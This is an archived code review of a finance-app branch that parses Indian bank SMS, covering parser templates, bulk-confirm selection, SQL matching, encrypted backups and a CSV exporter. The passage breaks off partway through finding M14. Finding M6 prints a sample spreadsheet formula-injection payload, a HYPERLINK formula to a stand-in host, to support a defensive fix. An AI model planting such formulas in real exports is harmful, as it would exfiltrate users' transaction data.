# Archived code review — `codex/t108-bank-capture-coverage`

**Reviewed:** 12 tasks, 31 files, +1315/−151 (`8d5f352..e1cf456`)
**Verdict:** **Request Changes** — 3 CRITICAL, 20 MAJOR

---

## Summary

The branch is broad and generally well-structured: the encrypted backup work is
careful, the T-096 confirmation dialog correctly uses `context.mounted` guards,
and no new code logs SMS content (privacy invariant holds). But three defects
block merge:

1. **T-108's eight new templates can never match a single SMS** — they declare a
   date format the normalizer doesn't support, so every match throws and is
   swallowed. The feature is inert.
2. **Those same templates are marked `provenance: "device"` with zero fixtures**,
   which violates ADR 0005. Once (1) is fixed they parse at 0.97 and silently
   auto-label based on unverified formats — exactly the failure ADR 0005 exists
   to prevent.
3. **T-116's "Select all" ignores the new search filter**, so a filtered user can
   bulk-confirm transactions they never saw.

T-109's SQL refactor is also a net correctness regression (narrower than the
predicate it replaced, and divergent from `RuleRepository`), and T-098's CSV
exporter is unreachable dead code with a formula-injection hole.

Findings below were verified by executing the regexes, LIKE patterns, and
classifier logic against realistic Indian bank SMS. The vendored SDK
(`.tooling/flutter`) is a macOS arm64 build and could not run in this
environment, so `flutter test` / `flutter analyze` were **not** executed —
please run both before merging.

---

## CRITICAL

### C1 — All 8 new templates silently fail to parse (`dd-MMM-yy` unsupported)

**Severity:** CRITICAL
**Location:** `assets/templates/hdfcbk.json:12`, `assets/templates/icicib.json:12` (all 8 entries) · root cause `lib/capture/template_engine/field_normalizer.dart:91`

Every new template declares `"date_format": "dd-MMM-yy"`. `FieldNormalizer.parseDate`
supports only `ddMMMyy`, `dd-MM-yy`, `dd/MM/yy`, `dd-MM-yyyy`, `dd/MM/yyyy`.
`dd-MMM-yy` is not in that set, so control falls through to the numeric branch:

```
value = '15-Jul-26' → split(/[-/]/) → ['15','Jul','26'] → int.parse('Jul')
                                                        → FormatException
```

`TemplateMatcher.match` catches `FormatException` and `continue`s
(`template_matcher.dart:54`), so the regex match is discarded, the next template
is tried, all 8 fail, and `match()` returns `null`. Every HDFC and ICICI SMS
falls through to the generic parser at ≤0.6 confidence with `ref_id`, `account`,
`channel`, and `direction` lost. **T-108 delivers no coverage at all.**

`dd-MMM-yy` appears in exactly these 8 entries and nowhere else in
`assets/templates/` — it was never a supported value.

**Suggested fix** — add the format to the normalizer (preferred; the format is
correct for real HDFC/ICICI messages):

```dart
// lib/capture/template_engine/field_normalizer.dart, in parseDate()
if (format == 'ddMMMyy') {
  return _parseAlphaMonthDate(value) ?? fallback;
}
// NEW: separator-ed alpha month, e.g. 15-Jul-26 / 15/Jul/26 (HDFC, ICICI).
if (format == 'dd-MMM-yy' || format == 'dd/MMM/yy') {
  final parts = value.split(RegExp(r'[-/]'));
  if (parts.length != 3) return fallback;
  final month = _monthNames[parts[1].toLowerCase()];
  if (month == null) return fallback;
  return DateTime.utc(
    _expandTwoDigitYear(int.parse(parts[2])),
    month,
    int.parse(parts[0]),
  );
}
```

Additionally, make the failure mode loud instead of silent — a template whose
`date_format` is unrecognised is an authoring bug, not an expected miss:

```dart
// Validate at registry load so a bad date_format fails fast in tests/CI.
static const _supportedDateFormats = {
  'ddMMMyy', 'dd-MM-yy', 'dd/MM/yy', 'dd-MM-yyyy', 'dd/MM/yyyy',
  'dd-MMM-yy', 'dd/MMM/yy',
};

static SmsTemplate fromJson(Map<String, Object?> json) {
  final dateFormat = json['date_format'] as String?;
  if (dateFormat != null && !_supportedDateFormats.contains(dateFormat)) {
    throw FormatException('Unsupported date_format: $dateFormat');
  }
  // ...
}
```

---

### C2 — Templates claim `device` provenance with no fixtures (ADR 0005 violation)

**Severity:** CRITICAL
**Location:** `assets/templates/hdfcbk.json:13,21,29,37`, `assets/templates/icicib.json:13,21,29,37`

All 8 entries declare `"provenance": "device"`. Per ADR 0005, `device` is the
gold tier — *"pulled from a real device by the owner, sanitized,
statement-reconcilable"* — and parses at **0.97, inside the silent auto-label
band**. But:

- `test/fixtures/sms/` contains `axisbk, centbk, indusind, kotak, paytmb, sbi,
  sample` — **no `hdfc` or `icici` directory**. There are zero fixtures, so no
  statement ground truth exists.
- The only evidence is the inline test bodies, which read as fabricated:
  `Coffee Shop`, `Supermarket`, `Bookstore`, `Electronics Store`, with dates
  `15-Jul-26`/`18-Jul-26`/`20-Jul-26`/`22-Jul-26` (all within the current week)
  and round ref numbers. ADR 0005: *"fabrication remains forbidden."*
- The two comparable precedents both chose `public`: `kotak.json` (6 entries) and
  `centbk.json` (3 entries), each backed by ≥10 sourced fixtures with
  `source_url` metadata and an end-to-end coverage gate
  (`test/fixtures/sms_t067_bank_fixture_coverage_test.dart`).

C1 currently masks this — the templates never match, so nothing auto-labels. **Fixing
C1 without fixing C2 activates silent auto-labelling of financial data from
unverified regexes.** Fix them together.

**Suggested fix** — downgrade to `public` (caps at 0.85, stays in the review
band) until device fixtures exist:

```json
{
  "id": "hdfc_upi_debit_v1",
  "regex": "...",
  "direction": "debit",
  "channel": "upi",
  "date_format": "dd-MMM-yy",
  "provenance": "public"
}
```

and add fixtures + the coverage gate, mirroring T-067:

```dart
// test/fixtures/sms_t108_bank_fixture_coverage_test.dart
for (final bank in ['hdfcbk', 'icicib']) {
  test('$bank has sourced fixtures with >=90% exact coverage', () async {
    // ...same shape as sms_t067_bank_fixture_coverage_test.dart:
    // asserts >=10 positives, every fixture provenance == 'public',
    // every .expected.json carries a non-empty source_url, and runs the
    // real assets/templates/$bank.json through ParserCascade.
  });
}
```

Promotion to `device` should go through the ADR 0005 trust-ledger path
(≥20 confirmed parses, zero amount/direction corrections), not a hand-edited
JSON field.

---

### C3 — "Select all" + active search confirms invisible transactions

**Severity:** CRITICAL
**Location:** `lib/features/review/weekly_review_screen.dart:394-436` (child) · `:62,100-107` (parent)

Search state lives in `_ReviewListState._searchQuery`; selection state lives in
the parent `_WeeklyReviewScreenState._selectedIds`. The parent has no knowledge
of the filter, so:

```
1. 100 items loaded; user types "Swiggy" → 3 tiles visible
2. allSelected computed over filteredItems (3)          → :394
3. Tap "Select all" → widget.onSelectAll()              → :432
4. Parent _selectAll(value) selects ALL 100 loaded ids   → :100
5. Checkbox renders checked (all 3 filtered are in the 100)
6. Tap Confirm → _confirm(_visibleSelection(value))      → :63
   → 100 transactions confirmed; 97 never rendered
```

Confirming is destructive and irreversible: it writes `status='confirmed'` and
emits feedback rows that train the classifier. A user who searches to confirm
three Swiggy charges silently confirms their whole backlog. In every other app
"Select all" means "all visible".

**Suggested fix** — hoist the query to the parent so filter and selection share
one source of truth:

```dart
// _WeeklyReviewScreenState
String _searchQuery = '';

List<TransactionReviewItem> _filtered(List<TransactionReviewItem> items) {
  if (_searchQuery.isEmpty) return items;
  final q = _searchQuery.toLowerCase();
  return items.where((item) =>
      item.displayName.toLowerCase().contains(q) ||
      item.categoryName?.toLowerCase().contains(q) == true ||
      item.counterpartyKey?.toLowerCase().contains(q) == true,
  ).toList(growable: false);
}

// in build(), pass the filtered list down and scope every callback to it:
AsyncData(:final value) => _ReviewCentre(
    items: _filtered(value),
    searchQuery: _searchQuery,
    onSearchChanged: (q) => setState(() => _searchQuery = q),
    selectedIds: _visibleSelection(_filtered(value)),
    onSelectAll: () => _selectAll(_filtered(value)),
    onConfirmSelected: () => _confirm(
      _visibleSelection(_filtered(value)),
      successLabel: 'transactions confirmed',
    ),
    // ...
  ),
```

Add a regression test:

```dart
testWidgets('select all only selects search-filtered items', (tester) async {
  // ... 1 Swiggy + 2 Zomato in the queue
  await tester.enterText(find.byKey(const ValueKey('review_search_field')), 'Swiggy');
  await tester.pumpAndSettle();
  await tester.tap(find.text('Select all'));
  await tester.pumpAndSettle();
  expect(find.text('Confirm (1)'), findsOneWidget); // not (3)
});
```

---

## MAJOR

### M1 — T-109 retro-application is narrower than the rule it creates

**Severity:** MAJOR
**Location:** `lib/data/repositories/transaction_repository.dart:704-712`

The removed `_matchesRuleInput` used `merchantRaw.contains(expected)` — substring
anywhere. The replacement matches exact, or `expected` + delimiter **anchored at
string start**. `RuleRepository.findMatch` (also changed on this branch,
`rule_repository.dart:38-41`) uses `RegExp(r'\b' + escape(value) + r'\b')` —
a true word boundary anywhere.

So the rule applied *going forward* and the retro-application of the *same* rule
disagree. Verified:

| `merchantRaw` | retro (SQL) | future (rule) | |
|---|---|---|---|
| `Swiggy` | ✅ | ✅ | |
| `Swiggy Instamart` | ✅ | ✅ | |
| `SWIGGY-INSTAMART` | ✅ | ✅ | |
| `PAYTM*SWIGGY` | ❌ | ✅ | **divergence** |
| `UPI-SWIGGY-9876` | ❌ | ✅ | **divergence** |
| `Order from Swiggy` | ❌ | ✅ | **divergence** |
| `BLINKIT via Swiggy` | ❌ | ✅ | **divergence** |

The `'$expected*%'` pattern shows the intent was to catch `PAYTM*SWIGGY` — but
as a prefix pattern it only matches `SWIGGY*…`, never `…*SWIGGY`. UPI merchant
strings from SMS are overwhelmingly mid-string (`UPI/SWIGGY/…`,
`PAYTM*SWIGGY`), so "existing and future" quietly corrects almost nothing while
the rule keeps firing on new rows — the user sees the rule work going forward
and assumes history was fixed.

**Suggested fix** — match `RuleRepository` semantics exactly, with both-side
delimiters, and share one predicate:

```dart
// Boundary chars observed in SMS merchant strings. Keep in sync with
// RuleRepository.findMatch — both sides must agree or retro-application
// silently diverges from the rule it creates.
const _boundaries = [' ', '*', '-', '/', '.', ':', '|', ',', '#'];

Expression<bool> _merchantBoundaryMatch(
  GeneratedColumn<String> column,
  String needle,
) {
  final n = _escapeLike(needle);
  var expr = column.lower().equals(needle);
  for (final l in _boundaries) {
    expr = expr | column.lower().like('%$l$n', escape: '\\');      // suffix
    expr = expr | column.lower().like('$n$l%', escape: '\\');      // prefix
    for (final r in _boundaries) {
      expr = expr | column.lower().like('%$l$n$r%', escape: '\\'); // infix
    }
  }
  return expr;
}
```

Given the combinatorial blowup, a `CustomExpression` with SQLite's `REGEXP`
(registered via `sqlite3_create_function`) or a normalized
`merchant_tokens(txn_id, token)` side table is cleaner. A token table also fixes
M3 (it can be indexed).

---

### M2 — Unescaped LIKE metacharacters cause over-broad mass recategorization

**Severity:** MAJOR
**Location:** `lib/data/repositories/transaction_repository.dart:707-711`

`expected` is derived from `merchantRaw` — text supplied by whoever sent the SMS
— and is interpolated straight into LIKE patterns. SQLite treats `_` as
single-char and `%` as multi-char wildcards. Verified:

```
needle 'amzn_in' → LIKE 'amzn_in %' matches:
  'amzn_in groceries'   ✅ intended
  'amzn-in groceries'   ❌ unintended
  'amznXin groceries'   ❌ unintended
  'amzn9in shop'        ❌ unintended

needle '50%off' → LIKE '50%off %' matches:
  '50 PERCENT off store' ❌ unintended
  '50XXXoff store'       ❌ unintended
```

`_` is common in real merchant strings (`AMZN_IN`, `PAYTM_UPI`). The blast radius
is a single `UPDATE` that rewrites `category_id` on every false positive, inside
the same transaction as the rule creation — no dry run, no affected-count
confirmation.

**Suggested fix:**

```dart
/// Escapes SQL LIKE wildcards so merchant text is matched literally.
/// Without this, a merchant containing `_` or `%` silently widens the
/// retro-correction to unrelated transactions.
String _escapeLike(String value) => value
    .replaceAll('\\', '\\\\')
    .replaceAll('%', '\\%')
    .replaceAll('_', '\\_');

final needle = _escapeLike(expected);
query.where((row) =>
    row.merchantRaw.lower().equals(expected) |
    row.merchantRaw.lower().like('$needle %', escape: '\\') |
    // ...
);
```

---

### M3 — T-109's performance premise doesn't hold (no index, and `lower()` defeats one)

**Severity:** MAJOR
**Location:** `lib/data/repositories/transaction_repository.dart:704-712` · `lib/data/db/tables/transactions_table.dart:12-28`

The task goal is indexed SQL matching instead of a full in-memory scan. Two
problems:

1. `transactions` has 8 declared indexes (`ts`, `merchant_id`, `category_id`,
   `ref_id`, `status`, `payment_source_id`, `owned_transfer_id`,
   `duplicate_of_txn_id`) — **`merchant_raw` and `counterparty_vpa` are not
   among them.**
2. Even with one, `row.merchantRaw.lower()` wraps the column in a function, and
   SQLite cannot use a plain B-tree index for `lower(col)`. Leading-`%` LIKE
   patterns are unindexable regardless.

The refactor is still a real win (rows are no longer deserialized into Dart
objects), but the query remains a full table scan. The claim in the task
description is inaccurate.

**Suggested fix** — expression indexes matching the query shape exactly:

```dart
// lib/data/db/tables/transactions_table.dart
// Expression indexes: _correctionTargets filters on lower(merchant_raw) /
// lower(counterparty_vpa); a plain column index cannot serve those.
@TableIndex.sql(
  'CREATE INDEX IF NOT EXISTS idx_transactions_merchant_raw_lower '
  'ON transactions (lower(merchant_raw));',
)
@TableIndex.sql(
  'CREATE INDEX IF NOT EXISTS idx_transactions_counterparty_vpa_lower '
  'ON transactions (lower(counterparty_vpa));',
)
```

Register both in the `database.dart` migration step. Note this accelerates only
the `equals` and prefix-`LIKE` arms; the suffix/infix arms from M1 need the token
table.

Also worth flagging: `lower()` in SQLite is ASCII-only without ICU, while Dart's
`String.toLowerCase()` is Unicode-aware. For non-ASCII merchant text the needle
and the column are lowercased by different rules and won't match.

---

### M4 — Passphrase floor on **import** permanently bricks older backups

**Severity:** MAJOR
**Location:** `lib/features/backup/encrypted_backup_service.dart:97-101`

The 12-char floor is enforced on `importBytes` *before* decryption is attempted.
Any archive exported before this change with a shorter passphrase is now
unrestorable through the app — the user is told their correct passphrase is
invalid. In a privacy-first on-device app the encrypted export is the only
recovery path, so this is a data-loss regression, not a hardening.

A passphrase floor is a policy about *new* secrets. It cannot retroactively
change a key that already encrypts existing ciphertext.

**Suggested fix** — enforce on export only; on import, attempt decryption and
surface a non-blocking upgrade prompt:

```dart
Future<void> importBytes({
  required Uint8List bytes,
  required String passphrase,
}) async {
  // No length floor here: archives created before the floor was introduced
  // must stay restorable. The floor is an export-time policy (see
  // minimumPassphraseLength) and cannot retroactively change an existing key.
  if (passphrase.isEmpty) {
    throw const EncryptedBackupException('Passphrase is required');
  }
  final payload = jsonDecode(utf8.decode(bytes)) as Map<String, Object?>;
  // ...
}
```

Then, after a successful restore with a sub-floor passphrase, prompt the user to
re-export with a stronger one.

---

### M5 — Passphrase floor duplicated across layers, with the constant in the UI

**Severity:** MAJOR
**Location:** `lib/features/backup/encrypted_backup_service.dart:65,97` · `lib/features/settings/settings_screen.dart:25`

`minimumBackupPassphraseLength = 12` is declared in `settings_screen.dart` — a UI
file — while the service, which is the actual security boundary, hardcodes the
literal `12` twice and does not reference the constant. Raising the UI constant
to 16 leaves the enforcement point at 12.

Separately, `String.length` counts UTF-16 code units, so a 6-emoji passphrase
passes a "12 character" check while `aaaaaaaaaaaa` also passes. Length alone is a
weak proxy, but at minimum the unit should match what the label promises.

**Suggested fix** — own the policy in the service and import it in the UI:

```dart
// encrypted_backup_service.dart
class EncryptedBackupService {
  /// Minimum passphrase length for NEW exports. Counted in runes so the
  /// number matches the "characters" the user sees. Import deliberately
  /// does not enforce this — see importBytes.
  static const minimumPassphraseLength = 12;

  void _assertExportPassphrase(String passphrase) {
    if (passphrase.runes.length < minimumPassphraseLength) {
      throw const EncryptedBackupException(
        'Passphrase must be at least $minimumPassphraseLength characters long',
      );
    }
  }
}

// settings_screen.dart — delete the local constant, use:
minimumLength: EncryptedBackupService.minimumPassphraseLength,
```

---

### M6 — CSV formula injection from third-party-controlled SMS text

**Severity:** MAJOR
**Location:** `lib/features/dev/transaction_export.dart:123-128`

`_escapeCsv` quotes `,`, `"`, `\n` — correct RFC 4180 quoting, but quoting does
not neutralize spreadsheet formulas. Excel, LibreOffice, and Google Sheets
evaluate any cell whose text begins with `=`, `+`, `-`, or `@`, including inside
quotes. Verified:

```
'=HYPERLINK("http://x/"&A1,"Receipt")' → '"=HYPERLINK(""http://x/""&A1,""Receipt"")"'  RISK
'+1-800-CALL'                          → '+1-800-CALL'                                 RISK
'@SUM(A1:A9)'                          → '@SUM(A1:A9)'                                 RISK
```

This matters more here than in a typical app: `merchantRaw` is supplied by
*whoever sent the SMS*. A crafted merchant name becomes a live formula the moment
the user opens their export — `=HYPERLINK` or `WEBSERVICE` turns a local-only
finance app into an exfiltration channel for the surrounding transaction data.
`refId` and `accountHint` come from the same source.

`\r` is also unescaped: `'ACME\rCORP'` passes through raw, and Excel treats a
bare CR as a row terminator, shifting every subsequent column.

**Suggested fix:**

```dart
/// Quotes per RFC 4180 and neutralizes spreadsheet formula evaluation.
///
/// Merchant/reference/account text originates from third-party SMS, so a
/// leading =, +, -, or @ would execute as a formula in Excel/Sheets on open
/// (e.g. =HYPERLINK/WEBSERVICE exfiltrating the row). Prefixing a single
/// quote is the standard mitigation and is stripped by spreadsheet importers.
static String _escapeCsv(String field) {
  var value = field;
  if (value.isNotEmpty && '=+-@\t\r'.contains(value[0])) {
    value = "'$value";
  }
  if (value.contains(',') ||
      value.contains('"') ||
      value.contains('\n') ||
      value.contains('\r')) {
    return '"${value.replaceAll('"', '""')}"';
  }
  return value;
}
```

Apply it to every field, not just the four currently wrapped — `direction`,
`channel`, and `status` are `TEXT` columns and a tampered or restored archive can
put a comma in them.

---

### M7 — `TransactionCsvExporter` is unreachable dead code

**Severity:** MAJOR
**Location:** `lib/features/dev/transaction_export.dart:84-133`

The only reference to `TransactionCsvExporter` anywhere in `lib/` or `test/` is
its own test at `test/features/dev/transaction_export_test.dart:111`. There is no
provider (contrast `transactionJsonExportProvider:72`), no UI entry point, and no
call to `exportCsvBytes()`. T-098 ships nothing user-visible.

The sibling `TransactionJsonExporter` also carries an explicit privacy contract
in its doc comment — *"the UI entry point is compiled out of release builds
(kDebugMode guard on the dev screen) and warns before writing normalized,
sensitive plaintext data"*. The CSV exporter has a one-line comment and no such
posture, so whoever wires it up has no guidance that it writes plaintext PII.

**Suggested fix** — mirror the JSON exporter's contract and wiring:

```dart
/// Debug-only plaintext CSV export of all non-deleted transactions.
///
/// Privacy: writes normalized, sensitive plaintext (merchant, amount,
/// account hint, reference) to a user-selected document. The UI entry point
/// MUST stay behind the kDebugMode guard on the dev screen and MUST warn
/// before writing. This is NOT the user-facing encrypted export (T-043).
class TransactionCsvExporter { /* ... */ }

final transactionCsvExportProvider =
    FutureProvider.autoDispose<bool>((ref) async {
  final database = await ref.watch(appDatabaseProvider.future);
  final bytes = await TransactionCsvExporter(database).exportCsvBytes();
  return ref.read(systemDocumentGatewayProvider).saveDocument(
        suggestedName: TransactionCsvExporter.fileName,
        mimeType: 'text/csv',
        bytes: bytes,
      );
});
```

---

### M8 — CSV amount and date formatting are wrong for a finance export

**Severity:** MAJOR
**Location:** `lib/features/dev/transaction_export.dart:105-108`

Two issues in the same block:

- `row.amount.toString()` on a `double` emits `499.0` (the test asserts exactly
  this at `transaction_export_test.dart:120`) and will emit
  `1450.5000000000001` for values that accumulated float error. Currency needs
  fixed 2-decimal formatting.
- `date` is a full UTC ISO-8601 timestamp under a column header named `Date`.
  The app targets India (IST, UTC+5:30), so a transaction at 02:00 IST exports
  with the **previous** calendar date. Any reconciliation against a bank
  statement will show phantom day-boundary mismatches. Spreadsheets also don't
  reliably auto-parse `2026-07-25T10:30:00.000Z` as a date across locales.

**Suggested fix:**

```dart
// Local calendar date: the header says "Date", and users reconcile against
// IST bank statements — a UTC timestamp shifts pre-05:30 IST rows a day back.
final local = DateTime.fromMillisecondsSinceEpoch(row.ts, isUtc: true).toLocal();
final date = '${local.year.toString().padLeft(4, '0')}-'
    '${local.month.toString().padLeft(2, '0')}-'
    '${local.day.toString().padLeft(2, '0')}';
final amount = row.amount.toStringAsFixed(2);
```

If the full timestamp is wanted, add a separate `Time` column rather than
overloading `Date`.

---

### M9 — Merchant capture truncates at the first period; `balance_after` silently dropped

**Severity:** MAJOR
**Location:** `assets/templates/icicib.json:17,25,33` · `assets/templates/hdfcbk.json:25,33`

Five templates end the merchant group with a lazy `(?<merchant>.+?)\.`, which
stops at the *first* period in the remainder. Verified against realistic bodies:

```
'... at AMAZON.IN. Avl Lmt INR 40,000'          → merchant = 'AMAZON'
'... at M/S. RELIANCE FRESH. Avl Lmt'           → merchant = 'M/S'
'... at Electronics Store.'                     → merchant = 'Electronics Store'  ✅
```

`AMAZON.IN`, `FLIPKART.COM`, `M/S.`, and `PVT.LTD.` are all common. Truncated
merchants fragment the merchant resolver and alias learning.

Worse, in `hdfc_account_debit_v1` the truncation also kills the optional balance
group. Because merchant is lazy and the balance group is optional, the engine
settles at the first period and lets the optional group match empty:

```
'Rs.500.00 ... to SWIGGY. Avl Bal: Rs.5,000.00'     → merchant='SWIGGY'  balance='5,000.00'  ✅
'Rs.500.00 ... to AMAZON.IN. Avl Bal: Rs.5,000.00'  → merchant='AMAZON'  balance=null        ❌
```

So `balance_after` populates only when the merchant happens to contain no
period — a silent, data-dependent field loss.

**Suggested fix** — split into two templates, most specific first (matching the
registry's documented ordering convention), and anchor the merchant on the
sentinel rather than any period:

```json
{
  "id": "hdfc_account_debit_balance_v1",
  "regex": "Rs\\.?\\s?(?<amount>[\\d,]+\\.?\\d*) debited from HDFC Bank A/C x(?<account>\\d{4}) on (?<date>\\d{2}-[A-Za-z]{3}-\\d{2}) to (?<merchant>.+?)\\.?\\s*Avl Bal:\\s*Rs\\.?\\s?(?<balance>[\\d,]+\\.?\\d*)",
  "direction": "debit",
  "channel": "unknown",
  "date_format": "dd-MMM-yy",
  "provenance": "public"
},
{
  "id": "hdfc_account_debit_v1",
  "regex": "Rs\\.?\\s?(?<amount>[\\d,]+\\.?\\d*) debited from HDFC Bank A/C x(?<account>\\d{4}) on (?<date>\\d{2}-[A-Za-z]{3}-\\d{2}) to (?<merchant>.+?)(?=\\.\\s|\\.$|$)",
  "direction": "debit",
  "channel": "unknown",
  "date_format": "dd-MMM-yy",
  "provenance": "public"
}
```

The `(?=\.\s|\.$|$)` lookahead ends the merchant at a period followed by
whitespace or end-of-string, so `AMAZON.IN` survives while the trailing sentence
period is still excluded.

Also: no template defines a `vpa` group, so `counterpartyVpa` is always `null`
for the two UPI templates even though UPI SMS commonly carry the payee VPA. If
the VPA is present in the real message format, capture it — `FieldNormalizer`
already reads `vpa` at `field_normalizer.dart:28`.

---

### M10 — T-108 tests duplicate the JSON inline, so the shipped assets are never tested

**Severity:** MAJOR
**Location:** `test/capture/hdfc_icici_template_test.dart:9-29,71-91`

Both `setUp` blocks paste a hand-escaped copy of the template JSON instead of
reading `assets/templates/hdfcbk.json` / `icicib.json`. Consequences:

- The shipped assets are never parsed by any test. They could be malformed JSON
  or absent from `pubspec.yaml` and the suite would stay green.
- Only 2 of 4 templates per bank are covered; `hdfc_account_debit_v1`,
  `hdfc_account_credit_v1`, `icici_account_debit_v1`, `icici_account_credit_v1`
  are untested — including the broken `balance` group (M9).
- Tests assert only `regex.firstMatch` + `namedGroup`. Neither `TemplateMatcher`
  nor `FieldNormalizer` is exercised, which is precisely why **C1 is invisible**:
  the regex matches fine; the normalizer is what throws.
- The inline copy can drift from the asset with no failure.

**Suggested fix** — load the real asset and go through the cascade:

```dart
import 'dart:io';

for (final bank in ['hdfcbk', 'icicib']) {
  group('$bank template registry', () {
    late TemplateRegistry registry;

    setUp(() {
      // Read the shipped asset — an inline copy silently drifts and leaves
      // the real file untested.
      registry = TemplateRegistry.fromJson(
        File('assets/templates/$bank.json').readAsStringSync(),
      );
    });

    test('every template produces a normalized record', () async {
      final matcher = TemplateMatcher(registries: [registry]);
      for (final fixture in fixturesFor(bank)) {
        final record = await matcher.match(fixture.sms);
        expect(record, isNotNull, reason: '${fixture.id} did not parse');
        expect(record!.ts, fixture.expectedTs);   // catches date_format bugs
        expect(record.amount, fixture.expectedAmount);
      }
    });
  });
}
```

Asserting on `ts` is the key addition — it is the only assertion that would have
caught C1.

---

### M11 — `transactionSourceProvider` leaks one live DB stream per viewed transaction

**Severity:** MAJOR
**Location:** `lib/features/transactions/transaction_detail_screen.dart:446` · `lib/features/transactions/transactions_providers.dart:64`

`transactionSourceProvider` is a `StreamProvider.family` **without**
`.autoDispose`. Family providers are cached per argument for the lifetime of the
`ProviderScope`, so each distinct `txnId` keeps a live Drift query stream open
forever.

Before this change the provider was reached only through the explicit
"view source" action. T-118 now `ref.watch`es it unconditionally on every detail
screen build, so browsing 200 transactions leaves 200 open streams — each with a
query subscription and a cached `TransactionSourceInfo`. This is the memory-leak
dimension flagged in the review request.

**Suggested fix:**

```dart
// transactions_providers.dart
// autoDispose: one instance per txnId is cached for the scope's lifetime
// otherwise, and the detail screen watches this for every transaction opened.
final transactionSourceProvider =
    StreamProvider.autoDispose.family<TransactionSourceInfo?, String>(
  (ref, txnId) {
    final databaseAsync = ref.watch(appDatabaseProvider);
    return databaseAsync.when(
      data: (database) => TransactionSourceRepository(database).watch(txnId),
      loading: () => const Stream<TransactionSourceInfo?>.empty(),
      error: (error, stackTrace) =>
          Stream<TransactionSourceInfo?>.error(error, stackTrace),
    );
  },
);
```

Check other `.family` providers on this branch for the same omission.

---

### M12 — Raw SMS body and confidence JSON render in release builds

**Severity:** MAJOR
**Location:** `lib/features/transactions/transaction_detail_screen.dart:455,483`

`SMS sender`, `SMS body`, and the raw `confidence_json` string are added to the
`Technical details` section with no `kDebugMode` or developer-mode gate. Credit
where due: `_DetailSection` is an `ExpansionTile`
(`transaction_detail_screen.dart:530`), so it is collapsed by default —
progressive disclosure at the section level is satisfied.

But the raw SMS body is the most sensitive artifact in the app. It can contain
OTPs, full account numbers, and balances, and the app deliberately purges
`raw_sms` after a retention window. Surfacing it in a production user-facing
screen means it appears in screenshots and the Android recents thumbnail, and is
read aloud by screen readers. Every other consumer of this class of data is
gated: `TransactionJsonExporter` is `kDebugMode`-guarded by contract, and the
other evidence surfaces live under `lib/features/dev/`.

The task is titled "**Developer** Evidence Disclosure", so a gate looks intended.

**Suggested fix:**

```dart
// Raw SMS body/sender and the confidence payload are developer evidence.
// They can contain OTPs, account numbers and balances, and raw_sms is
// retention-limited — keep them out of release builds and screenshots.
if (kDebugMode) ...[
  _FieldRow(label: 'SMS sender', value: source?.smsSender),
  _FieldRow(label: 'SMS body', value: source?.smsBody),
],
```

Gate the source `ref.watch` on the same condition so the query isn't issued in
release at all. If the intent is for real users to inspect evidence, put it
behind an explicit opt-in developer toggle in Settings rather than on by default.

Two smaller points on the same block:

- The `Builder` at `:445` achieves nothing. `ref` belongs to the `ConsumerState`,
  so `ref.watch` inside the closure rebuilds the **entire** screen, not the
  `Builder` subtree. Either drop the `Builder` or use a `Consumer` (which has its
  own `ref`) to genuinely scope the rebuild.
- `confidenceJson` is dumped raw into a `_FieldRow` with no `maxLines` and no
  `SelectableText`, so it wraps to an unreadable wall a developer cannot copy.
  Pretty-print it and make it selectable.

---

### M13 — `categorizeUnparsedSms` misclassifies most real messages

**Severity:** MAJOR
**Location:** `lib/features/dev/unparsed_sms_providers.dart:54-80`

The branch order is OTP → financial → balance, and the financial branch matches
bare `'inr'` and `'rs.'`. Two structural consequences, verified against realistic
bodies (5 of 6 wrong):

| Body | Classified | Should be |
|---|---|---|
| `Avail Bal in A/C XX1234 is INR 5,230.00 as on 25-Jul-26` | Unmatched financial | Balance / Statement |
| `Your account statement for Jul is ready. Bal Rs. 12,000` | Unmatched financial | Balance / Statement |
| `Credit card bill due Rs. 4,500 on 02-Aug-26` | Unmatched financial | Balance / Statement |
| `Rs.500 debited from A/C x1234. Login to NetBanking for details.` | **OTP / Auth** | Unmatched financial |
| `INR 899 spent on card xx4321. Do not share your password with anyone.` | **OTP / Auth** | Unmatched financial |
| `Your OTP for login is 123456` | OTP / Auth | ✅ |

1. **The Balance bucket is effectively unreachable.** Every real balance or
   statement SMS contains a currency token, so it is caught by the financial
   branch first. The dashboard will report ~0 balance messages.
2. **`'login'` and `'password'` in the OTP branch swallow genuine parser
   misses.** Bank transaction alerts routinely carry "Login to NetBanking for
   details" or "never share your password" footers, so real unparsed financial
   SMS get filed as OTP noise — inverting the diagnostic's entire purpose, which
   is to show a developer which financial formats need a template.

**Suggested fix** — order most-specific first, and use word-boundary regexes
instead of bare `contains`:

```dart
enum UnparsedReason {
  otpAuth('OTP / Authentication'),
  balanceInfo('Balance / Statement info'),
  unmatchedFinancial('Unmatched financial SMS'),
  promo('Non-transactional / Promo');

  const UnparsedReason(this.label);
  final String label;
}

final _otpPattern = RegExp(
  r'\b(otp|secret code|verification code|one[- ]time)\b', caseSensitive: false);
final _balancePattern = RegExp(
  r'\b(avail(?:able)?\s*bal|a/c bal|balance is|statement|bill due|min(?:imum)? due)\b',
  caseSensitive: false);
final _financialPattern = RegExp(
  r'\b(debited|credited|spent|paid|received|transferred|withdrawn)\b',
  caseSensitive: false);
final _currencyPattern = RegExp(r'(?:\binr\b|\brs\.?\b|₹)', caseSensitive: false);

UnparsedReason categorizeUnparsedSms(String body) {
  // Order matters: balance/statement messages always carry a currency token,
  // so they must be tested before the financial branch. "login"/"password"
  // are deliberately NOT OTP signals — transaction alerts carry them as
  // footers and would be misfiled as auth noise.
  if (_otpPattern.hasMatch(body)) return UnparsedReason.otpAuth;
  if (_balancePattern.hasMatch(body)) return UnparsedReason.balanceInfo;
  if (_financialPattern.hasMatch(body) || _currencyPattern.hasMatch(body)) {
    return UnparsedReason.unmatchedFinancial;
  }
  return UnparsedReason.promo;
}
```

Returning an `enum` also fixes a latent coupling: today the display string *is*
the grouping key, so renaming a label silently changes aggregation.

Add the missing cases to the test — the current test
(`unparsed_sms_screen_test.dart:206`) uses only an OTP and a debit message, which
is why neither bug was caught:

```dart
expect(categorizeUnparsedSms('Avail Bal in A/C XX1234 is INR 5,230.00'),
    UnparsedReason.balanceInfo);
expect(categorizeUnparsedSms('Rs.500 debited from A/C x1234. Login to NetBanking.'),
    UnparsedReason.unmatchedFinancial);
```

---

### M14 — Diagnostic providers report "0" for loading and error states

**Severity:** MAJOR
**Location:** `lib/features/dev/unparsed_sms_providers.dart:38-52,86-97`

Both new providers collapse the async state:

```dart
final unparsed = ref.watch(unparsedSmsListProvider).valueOrNull ?? const [];
```

While loading, and on error, this yields an empty list. The UI then hits
